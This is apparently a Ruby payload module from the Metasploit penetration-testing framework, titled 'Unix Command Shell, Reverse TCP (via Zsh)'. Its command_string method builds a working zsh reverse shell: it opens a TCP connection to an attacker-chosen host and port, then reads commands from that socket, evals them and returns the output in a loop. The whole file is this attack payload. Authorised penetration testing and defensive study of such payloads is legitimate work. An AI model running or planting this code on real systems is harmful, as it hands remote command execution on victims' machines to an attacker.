##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'        => 'Unix Command Shell, Reverse TCP (via Zsh)',
			'Description' => 'Connect back and create a command shell via Zsh',
			'Author'      => 'Doug Prostko <dougtko[at]gmail.com>',
			'License'     => MSF_LICENSE,
			'Platform'    => 'unix',
			'Arch'        => ARCH_CMD,
			'Handler'     => Msf::Handler::ReverseTcp,
			'Session'     => Msf::Sessions::CommandShell,
			'PayloadType' => 'cmd',
			'RequiredCmd' => 'zsh',
			'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
		))
	end

	def generate
		return super + command_string
	end

	def command_string
		cmd = "zmodload zsh/net/tcp;"
		cmd << "ztcp #{datastore['LHOST']} #{datastore['LPORT']};"
		cmd << "fd=$REPLY;"
		cmd << "while [ $REPLY ];do read -r cmd <&$REPLY;eval ${cmd} >&$REPLY;;done"
	end
end
